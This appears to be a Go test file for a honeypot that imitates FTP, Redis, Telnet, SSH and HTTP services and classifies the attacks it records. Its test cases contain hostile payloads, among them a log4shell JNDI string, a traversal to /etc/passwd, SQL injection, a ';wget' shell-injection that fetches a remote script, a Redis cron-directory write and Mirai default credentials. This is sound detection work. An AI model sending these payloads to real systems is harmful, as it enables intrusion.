package services

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"
)

// ── registry ──────────────────────────────────────────────────────────────────

func TestRegistryConsistency(t *testing.T) {
	seen := map[string]bool{}
	for _, s := range All() {
		key := fmt.Sprintf("%d/%s", s.Port, s.Proto)
		if seen[key] {
			t.Errorf("duplicate listener %s", key)
		}
		seen[key] = true
		if s.Name == "" {
			t.Errorf("port %d/%s has no service name in tcpServiceNames", s.Port, s.Proto)
		}
		if PortServiceName(fmt.Sprint(s.Port)) != s.Name {
			t.Errorf("PortServiceName(%d) mismatch", s.Port)
		}
	}
	if len(Ports("tcp", nil)) < 50 || len(Ports("udp", nil)) < 5 {
		t.Error("suspiciously few ports in registry")
	}
	// The management ports must never be handed to the firewall as UDP-only etc.
	disabled := map[int]bool{22: true, 80: true}
	for _, p := range Ports("tcp", disabled) {
		if p == 22 || p == 80 {
			t.Errorf("disabled port %d still listed", p)
		}
	}
}

func TestCustomHandlersCoverCustomPorts(t *testing.T) {
	e := NewEnv(func(string, string) bool { return false }, func(Capture) {}, t.TempDir(), 0)
	h, err := e.customHandlers()
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range customTCPPorts {
		if h[p] == nil {
			t.Errorf("no handler for custom port %d", p)
		}
	}
	if len(h) != len(customTCPPorts) {
		t.Errorf("handlers (%d) and customTCPPorts (%d) differ", len(h), len(customTCPPorts))
	}
}

// ── classifier ────────────────────────────────────────────────────────────────

func TestClassify(t *testing.T) {
	cases := []struct {
		payload, ua, want string
	}{
		{"GET /?x=${jndi:ldap://evil/a} HTTP/1.1", "", "log4shell"},
		{"GET /../../etc/passwd HTTP/1.1", "", "path-traversal"},
		{"GET /.env HTTP/1.1", "", "env-probe"},
		{"GET /wp-login.php HTTP/1.1", "", "wordpress-probe"},
		{"GET /a?id=1 UNION SELECT 1,2", "", "sqli"},
		{"GET /cgi-bin/x?cmd=;wget http://x/a.sh", "", "shell-injection"},
		{"GET /boaform/admin/formLogin", "", "router-exploit"},
		{"config set dir /var/spool/cron", "", "redis-exploit"},
		{"GET / HTTP/1.1", "Mozilla/5.0 zgrab/0.x", "scanner:zgrab"},
		{"GET / HTTP/1.1", "python-requests/2.31", "scanner:python-requests"},
	}
	for _, c := range cases {
		got := Classify(c.payload, c.ua)
		found := false
		for _, g := range got {
			if g == c.want {
				found = true
			}
		}
		if !found {
			t.Errorf("Classify(%q,%q) = %v, want it to include %q", c.payload, c.ua, got, c.want)
		}
	}
	if got := Classify("GET /index.html HTTP/1.1", "Mozilla/5.0"); len(got) != 0 {
		t.Errorf("benign request tagged: %v", got)
	}
	if tags := ClassifyCreds("root", "xc3511"); len(tags) != 2 || tags[0] != "mirai-default-creds" {
		t.Errorf("ClassifyCreds = %v", tags)
	}
}

// ── harness ───────────────────────────────────────────────────────────────────

type captures struct {
	mu  sync.Mutex
	got []Capture
	ch  chan Capture
}

func newEnv(t *testing.T) (*Env, *captures) {
	cs := &captures{ch: make(chan Capture, 16)}
	e := NewEnv(func(ip, port string) bool { return ip == "203.0.113.9" }, func(c Capture) {
		cs.mu.Lock()
		cs.got = append(cs.got, c)
		cs.mu.Unlock()
		cs.ch <- c
	}, t.TempDir(), 0)
	return e, cs
}

func (cs *captures) wait(t *testing.T) Capture {
	t.Helper()
	select {
	case c := <-cs.ch:
		return c
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for capture")
		return Capture{}
	}
}

func serveTCPOn(t *testing.T, e *Env, h ConnHandler) string {
	t.Helper()
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { <-ctx.Done(); ln.Close() }()
	go e.serveTCP(ctx, ln, "9999", "test", h)
	return ln.Addr().String()
}

// ── text protocols ────────────────────────────────────────────────────────────

func TestFTPCredentialCapture(t *testing.T) {
	e, cs := newEnv(t)
	addr := serveTCPOn(t, e, ftpHandler)
	c, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	br := bufio.NewReader(c)
	line, _ := br.ReadString('\n')
	if !strings.HasPrefix(line, "220") {
		t.Fatalf("banner = %q", line)
	}
	fmt.Fprint(c, "USER anonymous\r\n")
	if l, _ := br.ReadString('\n'); !strings.HasPrefix(l, "331") {
		t.Errorf("USER reply = %q", l)
	}
	fmt.Fprint(c, "PASS a@b.c\r\n")
	if l, _ := br.ReadString('\n'); !strings.HasPrefix(l, "530") {
		t.Errorf("PASS reply = %q", l)
	}
	fmt.Fprint(c, "QUIT\r\n")
	c.Close()

	got := cs.wait(t)
	if got.Meta["user"] != "anonymous" || got.Meta["secret"] != "a@b.c" {
		t.Errorf("meta = %v", got.Meta)
	}
	if !strings.Contains(got.Detail, "ftp:") || !hasTag(got.Tags, "credential-attempt") {
		t.Errorf("detail/tags = %q %v", got.Detail, got.Tags)
	}
	if strings.Contains(got.Detail, "a@b.c") {
		t.Error("password must not appear in Detail")
	}
}

func hasTag(tags []string, want string) bool {
	for _, t := range tags {
		if t == want {
			return true
		}
	}
	return false
}

func TestRedisCommandCapture(t *testing.T) {
	e, cs := newEnv(t)
	addr := serveTCPOn(t, e, redisHandler)
	c, _ := net.Dial("tcp", addr)
	fmt.Fprint(c, "*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n")
	fmt.Fprint(c, "*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n") // dup
	fmt.Fprint(c, "PING\r\n")
	reply, _ := bufio.NewReader(c).ReadString('\n')
	if !strings.HasPrefix(reply, "-NOAUTH") {
		t.Errorf("reply = %q", reply)
	}
	c.Close()
	got := cs.wait(t)
	if !strings.Contains(got.Detail, "CONFIG SET dir") || !hasTag(got.Tags, "redis-exploit") {
		t.Errorf("detail/tags = %q %v", got.Detail, got.Tags)
	}
}

func TestRESPParserBounds(t *testing.T) {
	for _, in := range []string{"*9999\r\n", "*1\r\n$99999\r\n", "*1\r\nfoo\r\n", "*-1\r\n"} {
		args, _, err := readRESPCommand(bufio.NewReader(strings.NewReader(in)))
		if err == nil && len(args) > 0 {
			t.Errorf("readRESPCommand(%q) accepted hostile input: %v", in, args)
		}
	}
}

func TestTelnetCredentialCapture(t *testing.T) {
	if testing.Short() {
		t.Skip("telnet handler sleeps 1s per attempt")
	}
	e, cs := newEnv(t)
	addr := serveTCPOn(t, e, telnetHandler)
	c, _ := net.Dial("tcp", addr)
	br := bufio.NewReader(c)
	c.SetDeadline(time.Now().Add(5 * time.Second))
	readUntil := func(s string) {
		var buf strings.Builder
		for !strings.Contains(buf.String(), s) {
			b, err := br.ReadByte()
			if err != nil {
				t.Fatalf("waiting for %q: %v (got %q)", s, err, buf.String())
			}
			buf.WriteByte(b)
		}
	}
	readUntil("login: ")
	fmt.Fprint(c, "root\r\n")
	readUntil("Password: ")
	fmt.Fprint(c, "xc3511\r\n")
	readUntil("Login incorrect")
	c.Close()
	got := cs.wait(t)
	if got.Meta["user"] != "root" || got.Meta["secret"] != "xc3511" || !hasTag(got.Tags, "mirai-default-creds") {
		t.Errorf("meta/tags = %v %v", got.Meta, got.Tags)
	}
}

// ── SSH ───────────────────────────────────────────────────────────────────────

func TestSSHCredentialCapture(t *testing.T) {
	e, cs := newEnv(t)
	h, err := e.sshHandler()
	if err != nil {
		t.Fatal(err)
	}
	addr := serveTCPOn(t, e, h)

	cfg := &ssh.ClientConfig{
		User:            "admin",
		Auth:            []ssh.AuthMethod{ssh.Password("hunter2")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-2.0-libssh_0.9.6",
		Timeout:         5 * time.Second,
	}
	if _, err := ssh.Dial("tcp", addr, cfg); err == nil {
		t.Fatal("login must never succeed")
	}
	got := cs.wait(t)
	if got.Meta["user"] != "admin" || got.Meta["secret"] != "hunter2" {
		t.Errorf("meta = %v", got.Meta)
	}
	if got.Meta["ssh_client"] == "" && got.Meta["attempts"] == "" {
		t.Errorf("expected ssh metadata, got %v", got.Meta)
	}
	if !hasTag(got.Tags, "credential-attempt") {
		t.Errorf("tags = %v", got.Tags)
	}

	// Host key is persisted: a second handler sees the same key.
	s1, _ := loadOrCreateHostKey(e.DataDir)
	s2, _ := loadOrCreateHostKey(e.DataDir)
	if ssh.FingerprintSHA256(s1.PublicKey()) != ssh.FingerprintSHA256(s2.PublicKey()) {
		t.Error("host key not persistent")
	}
}

// ── HTTP / HTTPS ──────────────────────────────────────────────────────────────

func serveHTTPOn(t *testing.T, e *Env, useTLS bool) string {
	t.Helper()
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { <-ctx.Done(); ln.Close() }()
	go e.serveHTTP(ctx, ln, "8080", useTLS)
	return ln.Addr().String()
}

func TestHTTPHoneypot(t *testing.T) {
	e, cs := newEnv(t)
	addr := serveHTTPOn(t, e, false)

	resp, err := http.Get("http://" + addr + "/")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 || !strings.Contains(string(body), "Welcome to nginx") ||
		!strings.HasPrefix(resp.Header.Get("Server"), "nginx/") {
		t.Errorf("root response wrong: %d %q %v", resp.StatusCode, body, resp.Header)
	}
	cs.wait(t)

	req, _ := http.NewRequest("POST", "http://"+addr+"/cgi-bin/x?a=${jndi:ldap://x/y}", strings.NewReader("cmd=;wget http://e/a.sh"))
	req.Header.Set("User-Agent", "zgrab/0.x")
	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 404 {
		t.Errorf("unknown path status = %d, want 404", resp.StatusCode)
	}
	got := cs.wait(t)
	for _, want := range []string{"log4shell", "shell-injection", "scanner:zgrab", "cgi-bin-probe"} {
		if !hasTag(got.Tags, want) {
			t.Errorf("missing tag %q in %v", want, got.Tags)
		}
	}
	if !strings.Contains(string(got.Data), "cmd=;wget") || got.Meta["method"] != "POST" {
		t.Errorf("request body/meta not captured: %q %v", got.Data, got.Meta)
	}
}

func TestHTTPConnectOnlyIsRecorded(t *testing.T) {
	e, cs := newEnv(t)
	addr := serveHTTPOn(t, e, false)
	c, _ := net.Dial("tcp", addr)
	c.Close()
	got := cs.wait(t)
	if !hasTag(got.Tags, "connect-only") {
		t.Errorf("tags = %v", got.Tags)
	}
}

func TestHTTPSFingerprintAndNonTLS(t *testing.T) {
	e, cs := newEnv(t)
	addr := serveHTTPOn(t, e, true)

	client := &http.Client{Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true, ServerName: "honey.test"},
	}}
	resp, err := client.Get("https://" + addr + "/.env")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	got := cs.wait(t)
	if got.Meta["ja3"] == "" || got.Meta["ja4"] == "" || got.Meta["sni"] != "honey.test" {
		t.Errorf("TLS fingerprint meta missing: %v", got.Meta)
	}
	if !hasTag(got.Tags, "env-probe") {
		t.Errorf("tags = %v", got.Tags)
	}

	// Plain HTTP spoken to the TLS port is recorded and classified.
	c, _ := net.Dial("tcp", addr)
	fmt.Fprint(c, "GET /../../etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n")
	got = cs.wait(t)
	c.Close()
	if !hasTag(got.Tags, "non-tls") || !hasTag(got.Tags, "path-traversal") {
		t.Errorf("non-TLS capture tags = %v", got.Tags)
	}
}

// ── limits ────────────────────────────────────────────────────────────────────

func TestConnectionLimitAndBans(t *testing.T) {
	cs := &captures{ch: make(chan Capture, 16)}
	e := NewEnv(func(ip, _ string) bool { return false }, func(c Capture) { cs.ch <- c }, t.TempDir(), 1)
	release := make(chan struct{})
	addr := serveTCPOn(t, e, func(ctx context.Context, c net.Conn, ip string) Result {
		<-release
		return Result{}
	})
	c1, _ := net.Dial("tcp", addr)
	defer c1.Close()
	deadline := time.Now().Add(2 * time.Second)
	for e.Active() == 0 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	c2, _ := net.Dial("tcp", addr)
	c2.SetReadDeadline(time.Now().Add(2 * time.Second))
	if _, err := c2.Read(make([]byte, 1)); err == nil {
		t.Error("second connection should be closed when limit is reached")
	}
	if e.Rejected() == 0 {
		t.Error("Rejected counter not incremented")
	}
	close(release)
}
